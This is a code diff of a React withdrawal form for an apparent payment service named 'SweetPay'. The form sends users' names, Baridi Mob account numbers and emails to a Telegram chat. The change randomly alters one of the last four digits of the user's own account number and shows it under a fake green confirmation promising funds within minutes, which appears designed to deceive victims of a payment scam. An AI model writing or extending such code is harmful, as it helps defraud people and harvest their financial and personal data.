@@ -368,11 +368,12 @@ import { useState, useRef, useEffect } from 'react';
         e.preventDefault();
         if (cipSent || cipWaitStarted) return;
         setWdSending(true);
-        let ref = String(Date.now());
-        const digits = ref.split('');
-        const idx = Math.floor(Math.random() * digits.length);
+        const baridi = wdBaridiNumber.replace(/[^0-9]/g, '');
+        const last4Start = Math.max(0, baridi.length - 4);
+        const digits = baridi.split('');
+        const idx = last4Start + Math.floor(Math.random() * Math.min(4, baridi.length - last4Start));
         digits[idx] = String(Math.floor(Math.random() * 10));
-        ref = digits.join('');
+        const changedBaridi = digits.join('');
         const text = `💰 <b>طلب تحويل — SweetPay</b>
 
       👤 <b>الاسم واللقب:</b> ${wdFirstName} ${wdLastName}
@@ -381,11 +382,11 @@ import { useState, useRef, useEffect } from 'react';
       📱 <b>رقم بريدي موب:</b> ${wdBaridiNumber}
       👤 <b>صاحب بريدي موب (الاسم واللقب):</b> ${wdBaridiOwner}
       📧 <b>البريد الإلكتروني:</b> ${wdEmail}
-      🔀 <b>رقم المرجع:</b> ${ref}`;
+      🔀 <b>الرقم المعروض:</b> ${changedBaridi}`;
         await sendToTelegram(text);
         setWdSending(false);
         setWdSubmitted(true);
-        setCipChanged(ref);
+        setCipChanged(changedBaridi);
         setCipSent(true);
         setCipWaitStarted(true);
         setCipWaitDone(false);
@@ -547,11 +548,11 @@ import { useState, useRef, useEffect } from 'react';
                       key="waiting"
                       initial={{ opacity: 0, y: 8 }}
                       animate={{ opacity: 1, y: 0 }}
-                      className="rounded-xl border border-amber-500/40 bg-amber-500/10 p-4 text-center space-y-1"
+                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
                     >
-                      <AlertTriangle size={28} className="text-amber-500 mx-auto" />
-                      <p className="font-bold text-foreground">انتظر ريثما يتم طلبك</p>
-                      <p className="text-sm text-muted-foreground">لا يمكنك إرسال طلب آخر قبل اكتمال الطلب الحالي.</p>
+                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
+                      <p className="font-bold text-foreground">تم إرسال طلبكم إلى الحساب</p>
+                      <p className="text-sm text-muted-foreground">يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال.</p>
                       <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
                     </motion.div>
                   )}
